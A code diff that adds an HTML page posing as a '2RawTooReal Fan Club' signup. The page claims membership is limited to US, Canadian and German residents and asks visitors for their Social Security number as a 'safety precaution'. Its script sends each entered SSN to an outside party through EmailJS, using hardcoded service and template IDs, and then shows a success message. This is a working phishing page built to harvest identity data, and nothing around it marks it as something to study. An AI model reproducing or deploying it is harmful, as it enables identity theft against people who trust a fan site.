@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2RawTooReal Fan Club</title>
+    <style>
+        /* Reset styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #ff5733, #1c1c1c);
+            color: #fff;
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 12px;
+            padding: 30px;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        h1 {
+            font-size: 26px;
+            margin-bottom: 10px;
+            color: #ff5733;
+        }
+
+        h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #f4f4f4;
+        }
+
+        p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: none;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            outline: none;
+        }
+
+        button {
+            background: #ff5733;
+            color: #fff;
+            padding: 12px;
+            font-size: 18px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+        }
+
+        button:hover {
+            background: #ff784d;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>NOTE</h1>
+        <h2>SAFETY PRECAUTION</h2>
+        <p>To ensure a safe and secure experience for all members, the 2RawTooReal Fan Club is exclusively available to residents of the United States, Canada, and Germany. We kindly ask for S.S.N verification to confirm your residency and grant access to our community. This helps us maintain authenticity and uphold the integrity of our fan club. Thank you for understanding!</p>
+        <form>
+            <label for="ssn">Enter S.S.N for verification:</label>
+<input type="text" id="ssn" placeholder="XXX-XX-XXXX"  title="Format: XXX XX XXXX">
+
+            <button type="submit">Join Official Fan Club</button>
+        </form>
+    </div>
+
+    
+
+    
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+document.getElementById("joinFanClub").addEventListener("click", function() {
+            window.location.href = "file:///C:/Users/Admin/Documents/2rawtooreal/index%20-%20fan%20page%20-%20welcome%20page%20-%20Copy%20(4)%20-%20Copy.html";
+        });
+
+    (function(){
+        emailjs.init("In6o5Js1aeQVDKbMn"); // Replace with your EmailJS user ID
+    })();
+
+    document.querySelector("form").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        let ssn = document.getElementById("ssn").value;
+
+        emailjs.send("service_fgpqeua", "template_brlypoi", {
+            ssn: ssn
+        })
+        .then(function(response) {
+            alert("Your details have been sent successfully!");
+            console.log("SUCCESS", response);
+        }, function(error) {
+            alert("Oops! Something went wrong.");
+            console.log("FAILED", error);
+        });
+    });
+</script>
+
+
+</body>
+</html>
